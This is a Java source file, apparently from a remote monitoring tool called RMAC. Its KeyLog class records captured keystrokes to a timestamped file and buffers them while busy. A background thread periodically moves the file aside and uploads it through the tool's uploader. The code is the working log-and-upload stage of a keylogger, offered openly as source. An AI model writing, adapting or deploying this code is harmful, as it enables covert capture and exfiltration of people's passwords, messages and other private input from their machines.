package com.rmac.process;

import com.rmac.RMAC;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Constants;
import com.rmac.utils.Pair;
import com.rmac.utils.Utils;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.StandardCopyOption;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import lombok.Getter;
import lombok.Setter;
import lombok.extern.slf4j.Slf4j;

/**
 * Interface to write-to key-log output files and upload them at interval defined by
 * KeyLogUploadInterval configuration.
 */
@Getter
@Setter
@Slf4j
public class KeyLog {

  public PrintWriter writer;
  public Thread thread;
  /**
   * Whether Key-logging process is busy with tasks that cannot involve write operations on key-log
   * file.
   */
  boolean isBusy = false;
  /**
   * Buffer to hold key-logs when Key-logging process is busy and cannot directly write to key-log
   * file at the moment.
   */
  List<Pair<KeyLogCommand, String>> buffer;
  static boolean isNewLine = true;

  /**
   * Create key-log file and initialize its writer.
   */
  public KeyLog() {
    this.buffer = new ArrayList<>();

    if (RMAC.config.getKeyLog()) {
      this.openFileWriter();
    } else {
      writer = RMAC.fs.getNoopWriter();
    }

    RMAC.config.onChange((prop, value) -> {
      if ("KeyLog".equals(prop)) {
        boolean val = Boolean.parseBoolean(value);
        if (val) {
          this.resume();
        } else {
          this.pause();
        }
      }
    });

    thread = new Thread(this::run, "KLOutput");
  }

  public void start() {
    thread.start();
  }

  /**
   * Write to key-log output file, write to buffer if busy
   *
   * @param value Text to write.
   */
  public void println(String value) {
    if (isNewLine) {
      value = "[" + Instant.now().toString() + "] " + value;
    }
    if (!this.isBusy) {
      this.writer.println(value);
      this.writer.flush();
    } else {
      this.buffer.add(
          new Pair<>(KeyLogCommand.PRINTLN_WITH_VALUE, value));
    }
    isNewLine = true;
  }

  /**
   * Write to key-log output file a newline, write to buffer if busy
   */
  public void println() {
    String value = "";
    if (isNewLine) {
      value = "[" + Instant.now().toString() + "]\n";
    }
    if (!this.isBusy) {
      this.writer.println(value);
      this.writer.flush();
    } else {
      this.buffer.add(new Pair<>(KeyLogCommand.PRINTLN_WITH_VALUE, value));
    }
    isNewLine = true;
  }

  /**
   * Write to key-log output file, write to buffer if busy
   *
   * @param value Text to write.
   */
  public void print(String value) {
    if (isNewLine) {
      value = "[" + Instant.now().toString() + "] " + value;
    }
    if (!this.isBusy) {
      this.writer.print(value);
      this.writer.flush();
    } else {
      this.buffer.add(new Pair<>(KeyLogCommand.PRINT, value));
    }
    isNewLine = false;
  }

  /**
   * Open a writer to key-log file.
   */
  public void openFileWriter() {
    try {
      writer = RMAC.fs.getWriter(Constants.KEYLOG_LOCATION);
    } catch (FileNotFoundException e) {
      log.error("Could not open key-log file", e);
    }
  }

  /**
   * Close current writer, open another towards no-operation sink (for e.g. when key-log is disabled
   * via
   * <code>KeyLog</code> configuration property).
   */
  public void openNoopWriter() {
    writer.flush();
    writer.close();
    writer = RMAC.fs.getNoopWriter();
  }

  public void run() {
    try {
      while (!Thread.interrupted()) {
        // Wait until it is time to upload the current key-log output file
        synchronized (this.thread) {
          this.thread.wait(RMAC.config.getKeyLogUploadInterval());
        }

        // If key-logging is disabled via config, no need to upload
        if (!RMAC.config.getKeyLog()) {
          continue;
        }

        // Set to busy state, to re-direct all key-logs to buffer, until current key-log file upload is concluded.
        this.isBusy = true;

        // Upload current key-log output file
        writer.flush();
        try {
          String filePath = Constants.TEMP_LOCATION + "\\Key-" + Utils.getTimestamp() + ".txt";
          writer.close();
          RMAC.fs.move(Constants.KEYLOG_LOCATION, filePath, StandardCopyOption.REPLACE_EXISTING);
          writer = RMAC.fs.getWriter(Constants.KEYLOG_LOCATION);
          RMAC.uploader.uploadFile(filePath, ArchiveFileType.KEY);
        } catch (IOException e) {
          log.error("Could not move log file to be uploaded", e);
        } finally {
          // Once concluded, open the writer again
          try {
            writer.flush();
          } catch (Exception e) {
            this.openFileWriter();
          }
        }

        this.isBusy = false;
        // Unload all buffered key-logs to new key-log output file
        this.unloadBuffer();
      }
    } catch (InterruptedException | IllegalArgumentException e) {
      log.warn("KeyLog interrupted");
    }
  }

  /**
   * Write all buffered information to key-log output file.
   * <br>
   * <br>
   * <cite> Key-logs will be buffered and will not
   * be directly written to key-log file when Key-logging process is busy.
   * </cite>
   */
  public void unloadBuffer() {
    for (Pair<KeyLogCommand, String> buf : this.buffer) {
      if (buf.getFirst() == KeyLogCommand.PRINT) {
        this.print(buf.getSecond());
      } else if (buf.getFirst() == KeyLogCommand.PRINTLN_WITH_VALUE) {
        this.println(buf.getSecond());
      }
    }
    this.buffer.clear();
  }

  /**
   * Close writer and stop Key-logging process
   */
  public void shutdown() {
    this.thread.interrupt();
    if (Objects.nonNull(writer)) {
      writer.close();
    }
  }

  /**
   * Close current writer and open another to re-direct key-logs to no-op sink.
   */
  public void pause() {
    this.isBusy = true;

    this.openNoopWriter();

    this.isBusy = false;
  }

  /**
   * Close current writer and open another to re-direct key-logs to output file.
   */
  public void resume() {
    this.isBusy = true;

    writer.close();
    this.openFileWriter();

    this.isBusy = false;
  }
}

enum KeyLogCommand {
  PRINT,
  PRINTLN_WITH_VALUE
}